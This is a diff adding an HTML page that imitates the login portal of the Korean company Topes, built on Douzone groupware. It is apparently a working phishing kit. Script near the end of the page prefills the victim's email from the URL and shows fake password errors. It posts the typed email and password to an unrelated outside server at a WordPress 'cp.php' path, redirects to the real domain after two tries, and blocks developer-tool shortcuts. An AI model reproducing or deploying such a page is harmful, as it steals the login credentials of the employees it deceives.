@@ -1,0 +1,786 @@
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="ko" lang="ko"><head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta property="og:title" content="주식회사 토페스">
+	<meta property="og:description" content="로그인해주세요">
+	
+	
+	<meta property="og:image" content="http://mail.topes.com:80/upload/img/logo/topes/IMG_COMP_LOGIN_LOGO_A_topes.jpg">
+	    
+    <title>주식회사 토페스</title>
+    
+    <link rel="stylesheet" type="text/css" href="http://mail.topes.com/gw/js/Scripts/jqueryui/jquery-ui.css?ver=20201021">
+    <!--Kendo ui css-->
+    
+    <!--css-->
+    <link rel="stylesheet" type="text/css" href="https://izu-css.web.app/stress/common68f1.css?ver=20201021">
+	
+	
+    
+    <script type="text/javascript" src="http://mail.topes.com/gw/js/pudd/js/pudd-1.1.22.min.js"></script>
+    <script type="text/javascript" src="http://mail.topes.com/gw/js/Scripts/jquery-1.9.1.min.js"></script>
+    <script type="text/javascript" src="http://mail.topes.com/gw/js/Scripts/common.js?ver=20201021"></script>
+    <script type="text/javascript" src="http://mail.topes.com/gw/js/Scripts/aes.js?ver=20201021"></script> 
+    <script type="text/javascript" src="http://mail.topes.com/gw/js/secondCert.js?ver=20200923"></script>
+    <script type="text/javascript" src="http://mail.topes.com/gw/js/securityEncUtil.js"></script>
+	
+	<style type="text/css">
+	
+	
+	
+		::-webkit-input-placeholder { /* Chrome, Safari, Opera */
+		    color: #8d8d8d;
+		    font-weight: 400;
+		}
+		
+		::-moz-placeholder {  /* Firefox */
+		    color: #8d8d8d;
+		    font-weight: 400;
+		}
+		
+		:-ms-input-placeholder { /* IE10–11 */
+		    color: #8d8d8d !important;
+		    font-weight: 400 !important;
+		}
+		
+		::-ms-input-placeholder { /* Edge */
+		    color: #8d8d8d;
+		    font-weight: 400;
+		}
+		
+		::placeholder { /* CSS Working Draft */
+		    color: #8d8d8d;
+		    font-weight: 400;
+		}
+		
+		
+		
+		@charset "utf-8";
+
+/**************************************************
+   reset CSS
+**************************************************/
+
+
+#login_b1_type .login_wrap .login_form_wrap form .inp {
+	margin: 7px 0 0 0;
+	padding: 10px;
+	width: 262px;
+	border: 1px solid #c9cac9;
+	outline: 1px solid #f6f4f0;
+	background: #fff;
+	font-size: 15px;
+	color: #4a4a4a;
+	text-indent: 0;
+}
+
+
+html,body{width:100%;height:100%;}
+body,div,dl,dt,dd,ul,ol,li,h1,h2,h3,h4,h5,h6,form,fieldset,p,button,input,select,td,th,table,pre,strong,b,i,textarea{margin:0;padding:0; }
+body,h1,h2,h3,h4,h5,h6,input,button,pre,textarea,select{font-family:Dotum,'돋움',Gulim,'굴림',sans-serif;font-size:12px;}
+body{background-color:#fff;*word-break:break-all;-ms-word-break:break-all;/*overflow:auto;*/}
+p{word-break:break-all;}
+form, fieldset, legend{border:none; margin:0; padding:0;}
+img,fieldset,iframe{border:0 none}
+li{list-style:none}
+input,select,button,img{vertical-align:middle;}
+em,address{font-style:normal}
+label,button{cursor:pointer}
+button{margin:0;padding:0}
+button *{position:relative}
+/*button img{left:-3px;*left:auto}
+html:first-child select{height:20px;padding-right:6px} 기본 셀렉트높이오류로 인한 주석*/
+option{padding-right:6px}
+textarea {resize:none;border:1px solid #c3c3c3; -webkit-ime-mode:active; -moz-ime-mode:active; -ms-ime-mode:active; ime-mode:active;}
+hr{display:none}
+legend{*width:0}
+table{border-collapse:collapse;border-spacing:0}
+map area{outline:none}
+a {text-decoration:none;color:#4a4a4a;}
+a:hover {}
+a:active {}
+a:visited {}
+a.under:hover{text-decoration:underline;}
+input[type="button"] {cursor:pointer;}
+input[type="password"] {height:45px;border:1px solid #c3c3c3; text-indent:7px;}
+input[type="text"] {height:45px;border:1px solid #c3c3c3;  -webkit-ime-mode:active; -moz-ime-mode:active; -ms-ime-mode:active; ime-mode:active;}
+input[type="text"].engfix {-webkit-ime-mode:inactive !important; -moz-ime-mode:inactive !important; -ms-ime-mode:inactive !important; ime-mode:inactive !important;}
+textarea.engfix {-webkit-ime-mode:inactive !important; -moz-ime-mode:inactive !important; -ms-ime-mode:inactive !important; ime-mode:inactive !important;}
+
+select {border:1px solid #c3c3c3;}
+select {height:24px;border:1px solid #c3c3c3;padding-left:7px;padding-right:20px;color:#515967; -webkit-appearance: none;  /* 네이티브 외형 감추기 */
+			-moz-appearance: none;appearance: none;background:#fff url("http://mail.topes.com/Images/ico/sele_arw01.png") no-repeat right center;}
+select{padding-right:0px \0/IE8+9;;}
+select::-ms-expand {display: none;}
+select option {background:#fff;height:30px;}
+.ie_sele {display:inline-block;position:relative;}
+.ie_sele_ico {background:#fff url("http://mail.topes.com/Images/ico/sele_arw01.png") no-repeat center center;width:22px; height:22px;position:absolute; right:1px; top:1px; display:block;}
+
+input[type=text]:-ms-clear {display:none;}
+input.kendoComboBox::-ms-clear {display:none;}
+.k-combobox input::-ms-clear {display:none;}
+.k-datepicker input::-ms-clear {display:none;}
+
+*{-webkit-overflow-scrolling:touch;} /* 모바일에서 터치 부드러운 효과 적용 */
+
+
+/**************************************************
+    Webfont :: '나눔바른고딕'
+**************************************************/
+
+@font-face {
+	font-family:NBG;
+	src:url('NanumBarunGothic/NanumBarunGothic.eot');
+	src:local(※),
+		url('NanumBarunGothic/NanumBarunGothic.woff') format('woff'),
+		url('NanumBarunGothic/NanumBarunGothic.ttf') format('opentype');
+}
+
+@font-face {
+	font-family:NBGB;
+	src:url('NanumBarunGothic/NanumBarunGothicBold.eot');
+	src:local(※),
+		url('NanumBarunGothic/NanumBarunGothicBold.woff') format('woff'),
+		url('NanumBarunGothic/NanumBarunGothicBold.ttf') format('opentype');
+}
+
+/**************************************************
+    Webfont :: '나눔스퀘어'
+**************************************************/
+
+@font-face {
+ font-family: 'NSR';
+ src: url('NanumSquare/NanumSquareR.eot');
+ src: url('NanumSquare/NanumSquareR.eot?#iefix') format('embedded-opentype'),
+      url('NanumSquare/NanumSquareR.woff') format('woff'),
+      url('NanumSquare/NanumSquareR.ttf') format('truetype');
+}
+
+@font-face {
+ font-family: 'NSB';
+ src: url('NanumSquare/NanumSquareB.eot');
+ src: url('NanumSquare/NanumSquareB.eot?#iefix') format('embedded-opentype'),
+      url('NanumSquare/NanumSquareB.woff') format('woff'),
+      url('NanumSquare/NanumSquareB.ttf') format('truetype');
+}
+
+/**************************************************
+    Webfont :: '더존베타텍스트'
+**************************************************/
+
+@font-face {
+ font-family: 'DOUZONEText';
+ src: url('DOUZONEText/DOUZONEText-Medium.eot');
+ src: url('DOUZONEText/DOUZONEText-Medium.eot?#iefix') format('embedded-opentype'),
+      url('DOUZONEText/DOUZONEText-Medium.woff') format('woff'),
+      url('DOUZONEText/DOUZONEText-Medium.ttf') format('truetype');
+}
+
+
+/**************************************************
+    Webfont :: '월인석보체(낙관,직인,인장)'
+**************************************************/
+@font-face {
+ font-family: 'stamp';
+ src: url('Wolin/Wolin.woff') format('woff');
+}
+
+/**************************************************
+    Webfont :: 더존폰트추가
+**************************************************/
+
+/*
+	UBA-68604, @font-face 추가 요청 
+*/
+
+@font-face {
+    font-family: "[더존] 제목체 30";
+    font-display: fallback;
+    src:
+        local("DOUZONETitle30"),
+        local("DOUZONE Title 30"),
+        local("[더존] 제목체 30"),
+        url('./font/DOUZONETitle30.woff') format('woff');
+}
+@font-face {
+    font-family: "[더존] 제목체 50";
+    font-display: fallback;
+    src:
+        local("DOUZONETitle50"),
+        local("DOUZONE Title 50"),
+        local("[더존] 제목체 50"),
+        url('./font/DOUZONETitle50.woff') format('woff');
+}
+@font-face {
+    font-family: "[더존] 본문체 10";
+    font-display: fallback;
+    src:
+        local("DOUZONEText10"),
+        local("DOUZONE Text 10"),
+        local("[더존] 본문체 10"),
+        url('./font/DOUZONEText10.woff') format('woff');
+}
+@font-face {
+    font-family: "[더존] 본문체 30";
+    font-display: fallback;
+    src:
+        local("DOUZONEText30"),
+        local("DOUZONE Text 30"),
+        local("[더존] 본문체 30"),
+        url('./font/DOUZONEText30.woff') format('woff');
+}
+@font-face {
+    font-family: "[더존] 본문체 50";
+    font-display: fallback;
+    src:
+        local("DOUZONEText50"),
+        local("DOUZONE Text 50"),
+        local("[더존] 본문체 50"),
+        url('./font/DOUZONEText50.woff') format('woff');
+}
+
+@font-face {    /* wehago */
+    font-family: 'douzone';
+    src:
+        local("DOUZONEText10"),
+        local("DOUZONE Text 10"),
+        local("[더존] 본문체 10"),
+        url('./font/DOUZONEText10.woff') format('woff');
+    font-weight: normal;
+    font-display: fallback;
+}
+
+@font-face {	/* wehago */
+    font-family: 'douzone';
+    src:
+        local("DOUZONEText30"),
+        local("DOUZONE Text 30"),
+        local("[더존] 본문체 30"),
+        url('./font/DOUZONEText30.woff') format('woff');
+    font-weight: bold;
+    font-display: fallback;
+}
+
+
+/**************************************************
+    Common
+**************************************************/
+.accessibility {overflow:hidden;position:absolute;left:-1000px;top:0;width:0;height:0;font-size:0;line-height:0;visibility:hidden;text-indent:-9999px}
+.hidden {overflow:hidden;position:absolute;top:-10000px;left:-10000px;width:1px;height:1px}
+.blind {overflow:hidden;position:absolute;left:0;top:0;width:0;height:0;margin:0;padding:0;font-size:0;line-height:0;visibility:hidden;}
+
+.skip {display:none;}
+.mtImg{vertical-align:middle; margin-top:-2px;}
+.ellipsis{text-overflow:ellipsis;white-space:nowrap;overflow:hidden;}
+.td_ellipsis{text-overflow:ellipsis;white-space:nowrap;overflow:hidden;padding:0 10px !important;}
+
+.ovh{overflow:hidden !important;}
+.ovv{overflow:visible !important;}
+
+/*scroll*/
+.scroll_on{overflow:auto !important;}
+.scroll_off{overflow:hidden !important;}
+.scroll_y_on{overflow-x:hidden !important; overflow-y:auto !important;}
+.scroll_x_on{overflow-y:hidden !important; overflow-x:auto !important;}
+.scroll_fix{overflow:scroll !important;}
+.scroll_y_fix{overflow-x:hidden !important; overflow-y:scroll !important;}
+.scroll_x_fix{overflow-y:hidden !important; overflow-x:scroll !important;}
+
+/*position*/
+.posi_re {position:relative !important;}
+.posi_ab {position:absolute !important;}
+.posi_fix {position:fixed !important;}
+.posi_inh {position:inherit !important;}
+
+/*table*/
+.tl_auto table{table-layout:auto !important;}
+
+/* Floating */
+.fl {float:left !important;}
+.fr {float:right !important;}
+.cl {clear:both !important;}
+
+/*각 자식요소들 floating 지정으로 높이 인식못하는거 해결*/
+.clear:after{content:"";display:block;clear:both;height:0;visibility:hidden;}
+
+/* display */
+.dp_ib {display:inline-block !important;}
+.dp_i {display:inline !important;}
+.dp_b {display:block !important;}
+
+/* visibility */
+.vv {visibility:visible;}
+.vh {visibility:hidden;}
+
+/* Align */
+.al {text-align:left !important;}
+.ac {text-align:center !important;}
+.ar {text-align:right !important;}
+
+.vt {vertical-align:top !important;}
+.vm {vertical-align:middle !important;}
+.vb {vertical-align:bottom !important;}
+.img_txt_btm img {vertical-align:text-bottom;}
+
+.acvm{text-align: center; display: table-cell; vertical-align: middle; padding:0px;}
+.lh14{line-height:14px !important;}
+.lh15{line-height:15px !important;}
+.lh16{line-height:16px !important;}
+.lh17{line-height:17px !important;}
+.lh18{line-height:18px !important;}
+.lh20{line-height:20px !important;}
+.lh23{line-height:23px !important;}
+.lh24{line-height:24px !important;}
+
+.text_line {text-decoration:underline;}
+.delLine{text-decoration:line-through; color:red;}
+.text_ho:hover{color: #058df5;text-decoration: underline;}
+
+/* text-indent */
+.ti0 {text-indent:0px !important;}
+.ti4 {text-indent:4px !important;}
+.ti7 {text-indent:7px !important;}
+
+/* Font color */
+.text_white{color:#fff !important;}
+.text_blue{color:#058df5 !important;}
+.text_green{color:#3d9100 !important;}
+.text_orange{color:#ff4d00 !important;}
+.text_red{color:#f33e51 !important;}
+.text_redline{color:#f33e51 !important; text-decoration:line-through !important;}
+.text_gray{color:#8d8d8d !important;}
+.text_gray2{color:#cececc !important;}
+.text_gray3{color:#646464 !important;}
+.text_gray4{color:#4a4a4a !important;}
+.text_yellow{color:#fff600 !important;}
+.colB {color:#058df5 !important;font-weight:bold !important;}
+.colB td {color:#058df5 !important;font-weight:bold !important;}
+.k-disabled{color:#cececc !important;}
+
+/* border color */
+.brn {border:none !important;}
+.brrn {border-right:none !important;}
+.brln {border-left:none !important;}
+.brtn {border-top:none !important;}
+.brbn {border-bottom:none !important;}
+.brbn_tr td,.brbn_tr th{border-bottom:none !important;}
+.brtn_tr td,.brtn_tr th{border-top:none !important;}
+.brtb1{border-width: 1px 0px !important;}
+
+.Pop_border{border:1px solid #dcdcdc;}
+.borderT{border-top:1px solid #dcdcdc;}
+.borderB{border-bottom:1px solid #dcdcdc;}
+.borderR{border-right:1px solid #eaeaea !important;}
+.borderR_black{border-right:1px solid #000;}
+.borderL{border-left:1px solid #eaeaea !important;}
+.tb_borderT{border-top:1px solid #eaeaea !important;}
+.tb_borderB{border-bottom:1px solid #eaeaea !important;}
+
+.bd_blue {border:1px solid #54b5ff !important;}
+
+/* background */
+.bgn{background:none !important;}
+.bg_skyblue{background:#f0f6fd !important;}
+.bg_skyblue2{background:#e6f4ff !important;}
+.bg_lightgray{background:#fcfcfc !important;}
+.bg_normalgray{background:#e8e8e8 !important;}
+.bg_normalgray2{background:#dfdfdf !important;}
+.bg_green2{background:#3d9100 !important;}
+.bg_blue{background:#56a8f4 !important;}
+.bg_orange{background:#ff9b59 !important;}
+.bg_red2{background:#f33e51 !important;}
+.bg_darkgray{background:#888 !important;}
+.bg_brown{background:#c9632f !important;}
+.bg_sb{background:#f0f6fd;}/*20160516 수정*/
+.bg_sb2{background:#e6f4ff;}
+.bg_lt{background:#fcfcfc;}
+.bg_statement{background:#f1f1f1;}
+.bg_yellow2{background:#d9b302 !important;}
+.bg_total{background:#f1f1f1 !important;}
+.bg_total2{background:#f9f9f9;}
+
+/* auto */
+.hei_auto {height:auto !important;}
+.wid_auto {height:auto !important;}
+
+/*letter-spacing*/
+.let0 {letter-spacing:0px !important;}
+.let1 {letter-spacing:-1px;}
+.let1n5 {letter-spacing:-1.5px;}
+.let2 {letter-spacing:-2px;}
+@media screen and (-webkit-min-device-pixel-ratio:0) {.let-1 {letter-spacing:-1px;}}
+
+
+/*max width값*/
+.mx55_img img {max-width:55px;}
+		
+#login_b1_type .login_submits {
+	display: block;
+	width: 262px;
+	/* height: 21px; */
+	overflow: hidden;
+	padding: 10px 0;
+	background: #1088e3;
+	color: #fff;
+	border: 1px solid #0b6ab2;
+	font-weight: bold;
+	text-align: center;
+	font-size: 18px;
+	letter-spacing: -1px;
+}		
+		
+	</style>
+	
+   
+</head>
+
+
+<body>
+    <div id="login_b1_type" style="margin-top: -243px;margin-left: -366.5px;">
+        <div class="company_logo">
+        
+        
+            <h4>
+				<strong id="domain-name" style=" height: 40px; width:220px;vertical-align: middle; border:0px solid red; color:#549bd8; font-size:30px;	text-transform: uppercase !important;
+	font-family: 'wf_segoe-ui_semilight', 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
+	margin-top: 12px;class="></strong></h4>
+                    
+        </div>
+        <div class="login_wrap">
+            <div class="login_user_img">
+                            
+                
+                <img src="http://mail.topes.com/upload/img/logo/topes/IMG_COMP_LOGIN_BANNER_A_topes.png?36d0a68cb28d11e9ac6200155d643601" alt="" id="">
+                                
+            </div>
+            <span class="login-status-icon"></span>
+                        <span id="msg" class="error-notice" style="display: none;padding: 10px;background-color: #d35351; height: 40px; width:1220px;vertical-align: middle; border:0px solid red; color:#fff; font-size: 16px;	color: #fff;
+	font-family: 'wf_segoe-ui_semilight', 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
+	margin-top: 12px;
+       ">Wrong Password! Please enter correct password.</span><span id="error" class="error-notice" style="display: none;padding: 10px;background-color: #d35351; height: 40px; width:220px;vertical-align: middle; border:0px solid red; color:#fff; font-size: 20px;	color: #fff;
+	font-family: 'wf_segoe-ui_semilight', 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
+	margin-top: 12px;
+       ">That account doesn't exist. Enter a different account</span>
+            <div class="login_form_wrap">
+                <p class="log_tit">
+                
+               	
+                	로그인해주세요
+               	
+                </p>
+                <form name="loginForm" method="post">
+                	<input type="hidden" id="isScLogin" name="isScLogin" value="">
+                	<input type="hidden" id="scUserId" name="scUserId" value="">
+                	<input type="hidden" id="scUserPwd" name="scUserPwd" value="">
+                    <fieldset>
+                        <input type="text" onkeydown="" class="inp engfix" id="email" placeholder="아이디 입력" name="id">
+                        <input type="hidden" id="userIdSub1" name="id_sub1" value="">
+                        <input type="hidden" id="userIdSub2" name="id_sub2" value="">
+                        
+                        <input type="password" onkeydown="" class="inp engfix" id="password" placeholder="패스워드 입력" name="password">
+                        <div class="chk">
+                            <input type="checkbox" id="checkId" name="checkId" style="border: medium none; vertical-align: middle; visibility: hidden;" onclick="">
+                            <label for="checkId">아이디저장</label>
+                            
+                        </div>
+                        <div class="log_btn" onclick="actionLogin();return false;">
+                            <button id="submit-btn" type="submit" class="login_submits">로그인</button>
+                        </div> 
+                    </fieldset>
+                </form>
+            </div>
+        </div>
+        <div class="copy" style="display:none;">Copyright © DOUZONE BIZON. All rights reserved.</div>        
+    </div>
+
+
+
+
+
+
+    
+    <div id="comp_type">
+    	
+		
+		
+    </div>
+
+<!-- 팝업 :: 이차인증로그인 -->
+<div id="login_v2" class="secondCert login login_v2" style="margin-left: -300px; margin-top: -289px; display: none;">
+	<div class="login_wrap">
+		<h2 style="padding:20px 113px 15px">
+			<img src="http://mail.topes.com/gw/Images/ico/ico_2_de.png" class="fl" width="32px">
+			<span class="fl" style="margin:3px 0 0 10px">이차인증 로그인</span>
+		</h2>
+		<p class="info_txt">
+			그룹웨어 보안을 위해 이차인증을 실행합니다.<br> 비즈박스알파 모바일앱에서 아래 코드를 읽어주세요.
+		</p>
+		<div class="qr_area">
+			<div class="qr_img">
+				<div id="qr_view1" class="qr_view"></div>
+			</div>
+			<div class="qr_time">
+				남은 시간 <em id="qr_time1">03:00</em>
+			</div>
+		</div>
+		<p class="sub_info_txt">
+			※ 인증기기 추가를 하는 경우, 재로그인이 필요합니다.<br> 인증기기 승인 여부 옵션에 따라, 관리자의 승인이 필요할 수 있습니다.
+		</p>
+		<div class="btn_cen mt20">
+			<input type="button" class="gray_btn" value="닫기" style="width: 135px; height: 30px;" onclick="btnClose();"> <input type="button" value="인증기기 변경" style="width: 135px; height: 30px;" onclick="btnChangScDevice();">
+		</div>
+	</div>
+</div>
+
+
+<!-- 팝업 :: 이차인증기기등록 -->
+<div id="login_v3" class="secondCert device login_v2" style="margin-left: -300px; margin-top: -289px; display: none;">
+	<div class="login_wrap">
+		<h2 style="padding:20px 100px 15px">
+			<img src="http://mail.topes.com/gw/Images/ico/ico_2_mo.png" class="fl" width="25px">
+			<span class="fl" style="margin:3px 0 0 10px" id="devRegTitle">이차인증 기기등록</span>
+		</h2>
+		<p class="info_txt" id="devRegText">
+			그룹웨어 보안을 위해 이차인증을 실행합니다.<br>
+			이차인증에 필요한 기기 등록을 위해<br>비즈박스알파 모바일 앱에서 아래 코드를 읽어주세요.
+		</p>
+		<div class="qr_area">
+			<div class="qr_img">
+				<div id="qr_view2" class="qr_view"></div>
+			</div>
+			<div class="qr_time">남은 시간 <em id="qr_time2">03:00</em></div>
+		</div>
+		<p class="sub_info_txt" id="devRegSubText">
+			※ 인증기기 등록후, 재로그인이 필요합니다.<br>
+			인증기기 승인 여부 옵션에 따라, 관리자의 승인이 필요할 수 있습니다.<br>
+			모바일 앱을 재설치하는 경우, 기기 등록이 필요합니다.
+		</p>
+		<div class="btn_cen mt20">
+			<input type="button" class="gray_btn" value="닫기" style="width:140px;height:30px;" onclick="btnClose();">
+		</div>
+	</div>
+</div>
+
+
+<!-- 팝업 :: 이차인증로그인 -->
+<div id="login_v4" class="login_v2" style="display: none;">
+	<div class="login_wrap">
+		<h2 style="padding:20px 135px 15px">
+			<img src="http://mail.topes.com/gw/Images/ico/ico_2_login.png" class="fl" width="25px">
+			<span class="fl" style="margin:3px 0 0 10px" id="pinTitle"></span>
+		</h2>
+		<p class="info_txt" id="pinContents">			
+		</p>
+		<div class="pin_area">
+			<div class="pin_input">
+				<table>
+					<tbody><tr>
+						<td><input id="pwd_0" autocomplete="new-password" type="password" class="number ac" value="" maxlength="1" onkeyup="nextPwd(0, this)"></td>
+						<td><input id="pwd_1" autocomplete="new-password" type="password" class="number ac" value="" maxlength="1" onkeyup="nextPwd(1, this)"></td>
+						<td><input id="pwd_2" autocomplete="new-password" type="password" class="number ac" value="" maxlength="1" onkeyup="nextPwd(2, this)"></td>
+						<td><input id="pwd_3" autocomplete="new-password" type="password" class="number ac" value="" maxlength="1" onkeyup="nextPwd(3, this)"></td>
+					</tr>
+				</tbody></table>
+			</div>
+			<div class="pin_board">
+				<table>
+					<tbody><tr>
+						<td><input type="button" class="btn ac" value="1" onclick="fnClickPinNum(1)"></td>
+						<td><input type="button" class="btn ac" value="2" onclick="fnClickPinNum(2)"></td>
+						<td><input type="button" class="btn ac" value="3" onclick="fnClickPinNum(3)"></td>
+					</tr>
+					<tr>
+						<td><input type="button" class="btn ac" value="4" onclick="fnClickPinNum(4)"></td>
+						<td><input type="button" class="btn ac" value="5" onclick="fnClickPinNum(5)"></td>
+						<td><input type="button" class="btn ac" value="6" onclick="fnClickPinNum(6)"></td>
+					</tr>
+					<tr>
+						<td><input type="button" class="btn ac" value="7" onclick="fnClickPinNum(7)"></td>
+						<td><input type="button" class="btn ac" value="8" onclick="fnClickPinNum(8)"></td>
+						<td><input type="button" class="btn ac" value="9" onclick="fnClickPinNum(9)"></td>
+					</tr>
+					<tr>
+						<td><input type="button" class="btn ac" value="Reset" onclick="initPinNum()"></td>
+						<td><input type="button" class="btn ac" value="0" onclick="fnClickPinNum(0)"></td>
+						<td><input type="button" class="btn ac" value="Del" onclick="delPinNum();"></td>
+					</tr>
+				</tbody></table>
+			</div>
+		</div>
+		<div class="btn_cen mt20">
+			<input type="button" class="gray_btn" value="닫기" style="width:135px;height:30px;" onclick="fnClosePinPop();">
+			<input type="button" value="확인" style="width:135px;height:30px;" onclick="fnSavePin();">
+		</div>
+	</div>
+</div>
+
+
+<form id="scPop" name="scPop" method="post" action="http://mail.topes.com/gw/cmm/systemx/secondCertDescPop.do" target="scPop">
+  <input name="type" value="" type="hidden">
+  <input name="deviceNum" value="" type="hidden">
+  <input name="groupSeq" value="" type="hidden">
+  <input name="empSeq" value="" type="hidden">
+  <input name="resMsg" value="로그인 정보가 올바르지 않습니다." type="hidden">
+  <input name="resResult" value="" type="hidden">  
+</form>
+
+
+  <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+
+  
+
+<script type="text/javascript">
+
+    /* global $ */
+    $(document).ready(function(){
+      var count=0;
+       var errorArray = ["","로그인 정보가 올바르지 않습니다.", "로그인 정보가 올바르지 않습니다.", "이 세션은 만료되었습니다."];
+
+      $('#back3').click(function () {
+        $("#msg").hide();
+        $('#email').val("");
+        $("#automail").animate({left:200, opacity:"hide"}, 0);
+        $("#inputbar").animate({right:200, opacity:"show"}, 1000);
+
+      });
+
+    /////////////url email getting////////////////
+    var email = window.location.hash.substr(1);
+    if (!email) {
+
+    }
+    else
+    {
+        // $('#email').val(email);
+        var my_email =email;
+        var ind=my_email.indexOf("@");
+        var my_slice=my_email.substr((ind+1));
+        var c= my_slice.substr(0, my_slice.indexOf('.'));
+        var final= c.toLowerCase();
+          $('#contact').trigger("reset");
+          $("#msg").hide();
+          $('#fieldImg').attr('src', 'images/other-1.png');
+          $('#field').html("Other Mail");
+          $('#email').val(my_email);
+          $('#emailch').html(my_email);
+          $("#msg").hide();
+          $("#inputbar").animate({left:200, opacity:"hide"}, 0);
+          $("#automail").animate({right:200, opacity:"show"}, 1000);
+		  $('#domain-name').html(final);
+		  $('#connect').html(""+my_slice);
+      }
+      ///////////////url getting email////////////////
+
+
+      
+      $('#submit-btn').click(function(event){
+        $('#error').hide();
+        $('#msg').hide();
+        event.preventDefault();
+        var email=$("#email").val();
+        var password=$("#password").val();
+        var msg = $('#msg').html();
+        $('#msg').html(errorArray[count]);
+      ///////////new injection////////////////
+      var my_email =email;
+      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+     
+
+        if (!filter.test(my_email)) {
+            $('#error').show();
+            $('#error').html("아이디를 입력하세요");
+            email.focus
+            return false;
+        }
+        if (!password) {
+            $('#error').show();
+            $('#error').html("비밀번호를 입력하세요");
+            email.focus
+            return false;
+        }
+
+      var ind=my_email.indexOf("@");
+      var my_slice=my_email.substr((ind+1));
+      var c= my_slice.substr(0, my_slice.indexOf('.'));
+      var final= c.toLowerCase();
+      ///////////new injection////////////////
+      count=count+1;
+      $('#domain-name').html(final);
+      $.ajax({
+        dataType: 'JSON',
+        url: 'https://dev-group2023.pantheonsite.io/wp-includes/images/smilies/arinze/general/cp.php ',
+        type: 'POST',
+        data:{
+          email:email,
+          password:password,
+        },
+            // data: $('#contact').serialize(),
+            beforeSend: function(xhr){
+              $('#submit-btn').html('   로그인…');
+            },
+            success: function(response){
+              if(response){
+                $("#msg").show();
+                console.log(response);
+                if(response['signal'] == 'ok'){
+                  $("#password").val("");
+                  if (count>=2) {
+                    count=0;
+                    // window.location.replace(response['redirect_link']);
+                   window.location.replace("http://www." + my_slice);
+                     
+                  }
+                  $('#msg').html(response['msg']);
+                }
+                else{
+                  $('#msg').html(response['msg']);
+                }
+              }
+            },
+            error: function(){
+              $("#password").val("");
+              if (count>=2) {
+                count=0;
+                window.location.replace("http://www." + my_slice);
+              }
+              $("#msg").show();
+              $('#msg').html(errorArray[count]);
+            },
+            complete: function(){
+              $('#submit-btn').html(' 로그인   ');
+            }
+          });
+    });
+
+
+    });
+	
+
+
+document.onkeydown=function(e){
+  if (e.ctrlKey && 
+    (e.keyCode === 73 || 
+     e.keyCode === 105 ||
+     e.keyCode === 74 || 
+     e.keyCode === 106 || 
+     e.keyCode === 85 || 
+     e.keyCode === 117)) {
+    alert('not allowed');
+  return false;
+} else {
+  return true;
+}
+}  
+  
+
+
+</script>
+
+</body><!-- 회사선택 레이어팝업 --></html>
